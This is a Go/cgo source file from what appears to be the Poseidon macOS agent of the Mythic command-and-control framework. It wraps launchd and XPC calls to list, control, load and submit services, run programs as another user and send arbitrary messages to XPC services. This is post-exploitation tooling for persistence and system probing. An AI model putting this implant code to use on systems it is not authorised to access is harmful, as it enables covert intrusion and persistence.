//go:build darwin

package xpc

/*
#cgo LDFLAGS: -framework Foundation
#cgo CFLAGS: -Wno-error=implicit-function-declaration
#include <dispatch/dispatch.h>
#include <Block.h>
#include <stdio.h>
#include <objc/objc.h>
#include <stdlib.h>
#include "xpc_wrapper_darwin.h"
*/
import "C"

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"io/ioutil"
	"log"
	"os"
	r "reflect"
	"unsafe"
)

type XPC struct {
	conn C.xpc_connection_t
}

type XpcMan struct {
	Emitter
	conn        XPC
	servicename string
}

func New(service string, privileged int) *XpcMan {
	x := &XpcMan{Emitter: Emitter{}}
	x.Emitter.Init()
	x.conn = XpcConnect(service, x, privileged)
	return x
}

func (x *XpcMan) HandleEvent(event Dict, err error) {
	if err != nil {
		return
	}

	// marshal the xpc.Dict object to raw, indented json and print it
	raw, err := json.Marshal(event)
	if err != nil {
		return
	}
	utils.PrintDebug(fmt.Sprintf("%v\n", raw))
	//results = raw
	return
}

type XpcEventHandler interface {
	HandleEvent(event Dict, err error)
}

func (x *XPC) Send(msg interface{}, verbose bool) {
	C.XpcSendMessage(x.conn, goToXpc(msg), C.bool(true), C.bool(verbose))
}

type Dict map[string]interface{}

func (d Dict) Contains(k string) bool {
	_, ok := d[k]
	return ok
}

func (d Dict) MustGetDict(k string) Dict {
	return d[k].(Dict)
}

func (d Dict) MustGetArray(k string) Array {
	return d[k].(Array)
}

func (d Dict) MustGetBytes(k string) []byte {
	return d[k].([]byte)
}

func (d Dict) MustGetHexBytes(k string) string {
	return fmt.Sprintf("%x", d[k].([]byte))
}

func (d Dict) MustGetInt(k string) int {
	return int(d[k].(int64))
}

func (d Dict) MustGetUUID(k string) UUID {
	return d[k].(UUID)
}

func (d Dict) GetString(k, defv string) string {
	if v := d[k]; v != nil {
		//log.Printf("GetString %s %#v\n", k, v)
		return v.(string)
	} else {
		//log.Printf("GetString %s default %#v\n", k, defv)
		return defv
	}
}

func (d Dict) GetBytes(k string, defv []byte) []byte {
	if v := d[k]; v != nil {
		//log.Printf("GetBytes %s %#v\n", k, v)
		return v.([]byte)
	} else {
		//log.Printf("GetBytes %s default %#v\n", k, defv)
		return defv
	}
}

func (d Dict) GetInt(k string, defv int) int {
	if v := d[k]; v != nil {
		//log.Printf("GetString %s %#v\n", k, v)
		return int(v.(int64))
	} else {
		//log.Printf("GetString %s default %#v\n", k, defv)
		return defv
	}
}

func (d Dict) GetUUID(k string) UUID {
	return GetUUID(d[k])
}

type Array []interface{}

func (a Array) GetUUID(k int) UUID {
	return GetUUID(a[k])
}

type UUID [16]byte

func (uuid UUID) String() string {
	return fmt.Sprintf("%x", [16]byte(uuid))
}

func GetUUID(v interface{}) UUID {
	if v == nil {
		return UUID{}
	}

	if uuid, ok := v.(UUID); ok {
		return uuid
	}

	if bytes, ok := v.([]byte); ok {
		uuid := UUID{}

		for i, b := range bytes {
			uuid[i] = b
		}

		return uuid
	}

	if bytes, ok := v.([]uint8); ok {
		uuid := UUID{}

		for i, b := range bytes {
			uuid[i] = b
		}

		return uuid
	}

	log.Fatalf("invalid type for UUID: %#v", v)
	return UUID{}
}

var (
	CONNECTION_INVALID     = errors.New("connection invalid")
	CONNECTION_INTERRUPTED = errors.New("connection interrupted")
	CONNECTION_TERMINATED  = errors.New("connection terminated")

	TYPE_OF_UUID  = r.TypeOf(UUID{})
	TYPE_OF_BYTES = r.TypeOf([]byte{})

	handlers = map[uintptr]XpcEventHandler{}
)

func runCommand(command string) ([]byte, error) {
	switch command {
	case "list":
		if len(args.ServiceName) == 0 {
			response := XpcLaunchList("")
			raw, err := json.MarshalIndent(response, "", "	")
			if err != nil {
				empty := make([]byte, 0)
				return empty, err
			}

			return raw, err
		}
		response := XpcLaunchList(args.ServiceName)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err
	case "print":
		if len(args.ServiceName) == 0 {
			response := XpcLaunchPrint("")
			return []byte(response), nil
		}
		response := XpcLaunchPrint(args.ServiceName)
		return []byte(response), nil

	case "start":
		if len(args.ServiceName) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing service name argument")
		}
		response := XpcLaunchControl(args.ServiceName, 1)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err

	case "stop":
		if len(args.ServiceName) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing service name argument")
		}
		response := XpcLaunchControl(args.ServiceName, 0)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err

	case "enable":
		if len(args.ServiceName) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing service name argument")
		}
		response := XpcLaunchControlEnableDisable(args.ServiceName, 1)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err
	case "disable":
		if len(args.ServiceName) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing service name argument")
		}
		response := XpcLaunchControlEnableDisable(args.ServiceName, 0)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err
	case "load":
		if len(args.File) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing file name argument")
		}
		response := XpcLaunchLoadPlist(args.File)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err

	case "unload":
		if len(args.File) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing file name argument")
		}
		response := XpcLaunchUnloadPlist(args.File)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err

	case "manageruid":
		response := XpcLaunchControlGetManagerUID()
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err
	case "remove":
		if len(args.ServiceName) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing service name argument")
		}
		response := XpcLaunchRemove(args.ServiceName)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err
	case "procinfo":
		if functions.IsElevated() {
			response := XpcLaunchProcInfo(args.Pid)
			return []byte(response), nil
		}
		return []byte("This subcommand requires root privileges"), nil
	case "dumpstate":
		response := XpcLaunchDumpState()
		return []byte(response), nil
	case "submit":
		if len(args.ServiceName) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing service name argument")
		}
		if len(args.Program) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing program argument")
		}
		response := XpcLaunchSubmit(args.ServiceName, args.Program)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err
	case "asuser":
		if len(args.Program) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing program argument")
		}
		response := XpcLaunchAsUser(args.Program, args.UID)
		raw, err := json.MarshalIndent(response, "", "	")
		if err != nil {
			empty := make([]byte, 0)
			return empty, err
		}

		return raw, err
	case "send":
		if len(args.Data) == 0 || len(args.ServiceName) == 0 {
			empty := make([]byte, 0)
			return empty, errors.New("Missing service name and/or service name argument")
		} else {
			base64DecodedSendData, err := base64.StdEncoding.DecodeString(args.Data)
			if err != nil {
				empty := make([]byte, 0)
				return empty, err
			}

			data := Dict{}
			err = json.Unmarshal(base64DecodedSendData, &data)
			if err != nil {
				empty := make([]byte, 0)
				return empty, err
			}

			var m *XpcMan
			m = New(args.ServiceName, 1)

			m.conn.Send(data, false)

		}
		return []byte("message sent"), nil
	default:
		return []byte("Command not supported"), nil
	}
}

func XpcLaunchList(service string) Dict {
	if len(service) == 0 {
		raw := C.XpcLaunchdListServices(nil)
		result := xpcToGo(raw).(Dict)
		return result
	} else {
		cservice := C.CString(service)
		defer C.free(unsafe.Pointer(cservice))
		raw := C.XpcLaunchdListServices(cservice)
		result := xpcToGo(raw).(Dict)
		return result
	}
}

func XpcLaunchPrint(service string) string {
	if len(service) == 0 {
		raw := C.XpcLaunchdPrint(nil)
		result := C.GoString(raw)
		return result
	} else {
		cservice := C.CString(service)
		defer C.free(unsafe.Pointer(cservice))
		raw := C.XpcLaunchdPrint(cservice)
		result := C.GoString(raw)
		return result
	}
}

func XpcLaunchDumpState() string {

	raw := C.XpcLaunchdDumpState()
	result := C.GoString(raw)
	return result

}

func XpcLaunchAsUser(program string, uid int) Dict {
	cProgram := C.CString(program)
	defer C.free(unsafe.Pointer(cProgram))
	cUid := C.int(uid)
	raw := C.XpcLaunchdAsUser(cProgram, cUid)
	result := xpcToGo(raw).(Dict)
	return result

}

func XpcLaunchControl(service string, startstop int) Dict {
	if len(service) == 0 {
		return Dict{
			"error": "service name required",
		}
	} else {
		cservice := C.CString(service)
		defer C.free(unsafe.Pointer(cservice))
		cstartstop := C.int(startstop)
		raw := C.XpcLaunchdServiceControl(cservice, cstartstop)
		result := xpcToGo(raw).(Dict)
		return result
	}
}

func XpcLaunchControlEnableDisable(service string, enabledisable int) Dict {
	if len(service) == 0 {
		return Dict{
			"error": "service name required",
		}
	} else {
		cservice := C.CString(service)
		defer C.free(unsafe.Pointer(cservice))
		cstartstop := C.int(enabledisable)
		raw := C.XpcLaunchdServiceControlEnableDisable(cservice, cstartstop)
		result := xpcToGo(raw).(Dict)
		return result
	}
}

func XpcLaunchControlGetManagerUID() Dict {

	raw := C.XpcLaunchdGetManagerUID()
	result := xpcToGo(raw).(Dict)
	return result

}

func XpcLaunchSubmit(label string, program string) Dict {
	if len(label) == 0 || len(program) == 0 {
		return Dict{
			"error": "label and program required",
		}
	} else {
		clabel := C.CString(label)
		cprogram := C.CString(program)
		defer C.free(unsafe.Pointer(clabel))
		defer C.free(unsafe.Pointer(cprogram))

		raw := C.XpcLaunchdSubmitJob(cprogram, clabel, 1)
		result := xpcToGo(raw).(Dict)
		return result
	}
}

func XpcLaunchRemove(service string) Dict {
	if len(service) == 0 {
		return Dict{
			"error": "service name required",
		}
	} else {
		cservice := C.CString(service)
		defer C.free(unsafe.Pointer(cservice))
		raw := C.XpcLaunchdRemove(cservice)
		result := xpcToGo(raw).(Dict)
		return result
	}
}

func XpcLaunchProcInfo(pid int) string {

	cpid := C.ulong(pid)
	raw := C.XpcLaunchdGetProcInfo(cpid)
	file := C.GoString(raw)
	dat, _ := ioutil.ReadFile(file)
	err := os.Remove(file)
	if err != nil {
		//fmt.Printf("Unable to remove file: %s", err.Error())
	}
	return string(dat)

}

func XpcLaunchLoadPlist(path string) Dict {
	if len(path) == 0 {
		return Dict{
			"error": "path required",
		}
	} else {
		cpath := C.CString(path)
		defer C.free(unsafe.Pointer(cpath))
		clegacy := C.int(1)
		raw := C.XpcLaunchdLoadPlist(cpath, clegacy)
		result := xpcToGo(raw).(Dict)
		return result
	}
}

func XpcLaunchUnloadPlist(path string) Dict {
	if len(path) == 0 {
		return Dict{
			"error": "path required",
		}
	} else {
		cpath := C.CString(path)
		defer C.free(unsafe.Pointer(cpath))
		raw := C.XpcLaunchdUnloadPlist(cpath)
		result := xpcToGo(raw).(Dict)
		return result
	}
}

func XpcConnect(service string, eh XpcEventHandler, privileged int) XPC {
	// func XpcConnect(service string, eh XpcEventHandler) C.xpc_connection_t {
	ctx := uintptr(unsafe.Pointer(&eh))
	handlers[ctx] = eh

	cprivileged := C.int(privileged)
	cservice := C.CString(service)
	defer C.free(unsafe.Pointer(cservice))
	// return C.XpcConnect(cservice, C.uintptr_t(ctx))
	return XPC{conn: C.XpcConnect(cservice, C.uintptr_t(ctx), cprivileged)}
}

//export handleXpcEvent
func handleXpcEvent(event C.xpc_object_t, p C.ulong) {
	//log.Printf("handleXpcEvent %#v %#v\n", event, p)

	t := C.xpc_get_type(event)

	eh := handlers[uintptr(p)]
	if eh == nil {
		//log.Println("no handler for", p)
		return
	}

	if t == C.TYPE_ERROR {
		if event == C.ERROR_CONNECTION_INVALID {
			// The client process on the other end of the connection has either
			// crashed or cancelled the connection. After receiving this error,
			// the connection is in an invalid state, and you do not need to
			// call xpc_connection_cancel(). Just tear down any associated state
			// here.
			//log.Println("connection invalid")
			eh.HandleEvent(nil, CONNECTION_INVALID)
		} else if event == C.ERROR_CONNECTION_INTERRUPTED {
			//log.Println("connection interrupted")
			eh.HandleEvent(nil, CONNECTION_INTERRUPTED)
		} else if event == C.ERROR_CONNECTION_TERMINATED {
			// Handle per-connection termination cleanup.
			//log.Println("connection terminated")
			eh.HandleEvent(nil, CONNECTION_TERMINATED)
		} else {
			//log.Println("got some error", event)
			eh.HandleEvent(nil, fmt.Errorf("%v", event))
		}
	} else {
		eh.HandleEvent(xpcToGo(event).(Dict), nil)
	}
}

// goToXpc converts a go object to an xpc object
func goToXpc(o interface{}) C.xpc_object_t {
	return valueToXpc(r.ValueOf(o))
}

// valueToXpc converts a go Value to an xpc object
//
// note that not all the types are supported, but only the subset required for Blued
func valueToXpc(val r.Value) C.xpc_object_t {
	if !val.IsValid() {
		return nil
	}

	var xv C.xpc_object_t

	switch val.Kind() {
	case r.Int, r.Int8, r.Int16, r.Int32, r.Int64:
		xv = C.xpc_int64_create(C.int64_t(val.Int()))

	case r.Uint, r.Uint8, r.Uint16, r.Uint32:
		xv = C.xpc_int64_create(C.int64_t(val.Uint()))

	case r.String:
		xv = C.xpc_string_create(C.CString(val.String()))

	case r.Map:
		xv = C.xpc_dictionary_create(nil, nil, 0)
		for _, k := range val.MapKeys() {
			v := valueToXpc(val.MapIndex(k))
			C.xpc_dictionary_set_value(xv, C.CString(k.String()), v)
			if v != nil {
				C.xpc_release(v)
			}
		}

	case r.Array, r.Slice:
		if val.Type() == TYPE_OF_UUID {
			// Array of bytes
			var uuid [16]byte
			r.Copy(r.ValueOf(uuid[:]), val)
			xv = C.xpc_uuid_create(C.ptr_to_uuid(unsafe.Pointer(&uuid[0])))
		} else if val.Type() == TYPE_OF_BYTES {
			// slice of bytes
			xv = C.xpc_data_create(unsafe.Pointer(val.Pointer()), C.size_t(val.Len()))
		} else {
			xv = C.xpc_array_create(nil, 0)
			l := val.Len()

			for i := 0; i < l; i++ {
				v := valueToXpc(val.Index(i))
				C.xpc_array_append_value(xv, v)
				if v != nil {
					C.xpc_release(v)
				}
			}
		}

	case r.Interface, r.Ptr:
		xv = valueToXpc(val.Elem())

	default:
		log.Fatalf("unsupported %#v", val.String())
	}

	return xv
}

//export arraySet
func arraySet(u C.uintptr_t, i C.int, v C.xpc_object_t) {
	a := *(*Array)(unsafe.Pointer(uintptr(u)))
	a[i] = xpcToGo(v)
}

//export dictSet
func dictSet(u C.uintptr_t, k *C.char, v C.xpc_object_t) {
	d := *(*Dict)(unsafe.Pointer(uintptr(u)))
	d[C.GoString(k)] = xpcToGo(v)
}

// xpcToGo converts an xpc object to a go object
//
// note that not all the types are supported, but only the subset required for Blued
func xpcToGo(v C.xpc_object_t) interface{} {
	t := C.xpc_get_type(v)
	//log.Printf("xpcToGo processing type %#v, value %#v, name: %s", t, v, C.GoString(C.xpc_type_get_name(t)))
	//desc := C.GoString(C.xpc_copy_description(v))
	//log.Printf("description: %s\n", desc)
	switch t {
	case C.TYPE_ARRAY:
		a := make(Array, C.int(C.xpc_array_get_count(v)))
		p := uintptr(unsafe.Pointer(&a))
		C.XpcArrayApply(C.uintptr_t(p), v)
		return a

	case C.TYPE_DATA:
		return C.GoBytes(C.xpc_data_get_bytes_ptr(v), C.int(C.xpc_data_get_length(v)))

	case C.TYPE_DICT:
		d := make(Dict)
		p := uintptr(unsafe.Pointer(&d))
		C.XpcDictApply(C.uintptr_t(p), v)
		return d

	case C.TYPE_INT64:
		return int64(C.xpc_int64_get_value(v))
	case C.TYPE_UINT64:
		return uint64(C.xpc_uint64_get_value(v))
	case C.TYPE_STRING:
		return C.GoString(C.xpc_string_get_string_ptr(v))
	case C.TYPE_UUID:
		a := [16]byte{}
		C.XpcUUIDGetBytes(unsafe.Pointer(&a), v)
		return UUID(a)

	case C.TYPE_ERROR:
		d := make(Dict)
		p := uintptr(unsafe.Pointer(&d))
		C.XpcDictApply(C.uintptr_t(p), v)
		return d
	case C.TYPE_BOOL:
		return C.xpc_bool_get_value(v)
	case C.TYPE_CONNECTION:
		log.Printf("Received connection xpc type: %#v", v)
	case C.TYPE_FD:
		log.Printf("Received file descriptor xpc type: %#v", v)
	case C.TYPE_NULL:
		log.Printf("Received null xpc type: %#v", v)
	case C.TYPE_SHMEM:
		log.Printf("Received shared memory xpc type: %#v", v)
	default:
		//log.Printf("unexpected type %#v, value %#v, name: %#v", t, v, C.GoString(C.xpc_type_get_name(t)))
		return C.GoString(C.xpc_copy_description(v))
	}
	return nil
}

// xpc_release is needed by tests, since they can't use CGO
func xpc_release(xv C.xpc_object_t) {
	C.xpc_release(xv)
}

// this is used to check the OS version

type Utsname struct {
	Sysname  string
	Nodename string
	Release  string
	Version  string
	Machine  string
}

func Uname(utsname *Utsname) error {
	var cstruct C.struct_utsname
	if err := C.uname(&cstruct); err != 0 {
		return errors.New("utsname error")
	}

	// XXX: this may crash if any value is exactly 256 characters (no 0 terminator)
	utsname.Sysname = C.GoString(&cstruct.sysname[0])
	utsname.Nodename = C.GoString(&cstruct.nodename[0])
	utsname.Release = C.GoString(&cstruct.release[0])
	utsname.Version = C.GoString(&cstruct.version[0])
	utsname.Machine = C.GoString(&cstruct.machine[0])

	return nil
}
